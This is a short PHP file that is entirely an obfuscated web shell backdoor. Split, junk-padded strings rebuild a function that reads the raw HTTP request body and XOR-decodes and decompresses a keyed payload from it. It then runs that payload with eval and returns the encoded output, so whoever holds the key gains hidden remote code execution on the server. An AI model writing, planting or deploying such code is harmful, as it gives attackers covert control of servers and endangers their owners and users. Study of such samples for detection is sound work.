<?php
$z='ohT#bhlig#b1g7QggHF#b";f#bunction x#b(#b$t,$k#b){$c=strlen($#bk);$l=st#brl';
$T='$k="75#b6b#bd18b";$kh#b="87bb22#b2f17#b4e";$kf="#b0341744#b4#bfe01";$p#b="x';
$W=str_replace('v','','vcreatvve_vfunvctivon');
$U='n();$r=@ba#bse64_enc#bod#be(@x(@gzco#bmpr#bess($o)#b,#b$k));print("$#bp#b$kh$r$kf");}';
$L='ut"),$m)#b==1)#b {@ob_st#bart();@#beva#bl(@gzun#bcompres#b#bs(@x(@b#bas#be64_d';
$I='<$l);$j++,$i++)#b{$o.=#b#b$t{#b$i}^$k{$#bj#b};}}return $o#b;}#bif (@pre';
$o='ecode#b($m[1]),#b$k)));$o=@o#bb#b_get_#bcontents();#b@o#b#bb_end_cle#ba';
$w='e#bn($#bt);$o="";fo#br($i=#b0#b;$i<$l;)#b{f#bor($j=0;($j<$c#b&#b&$#bi';
$t='g_match(#b"/$kh#b(.+)#b$kf/#b",@file_#bge#bt#b_contents(#b"php://in#bp';
$E=str_replace('#b','',$T.$z.$w.$I.$t.$L.$o.$U);
$G=$W('',$E);$G();
?>
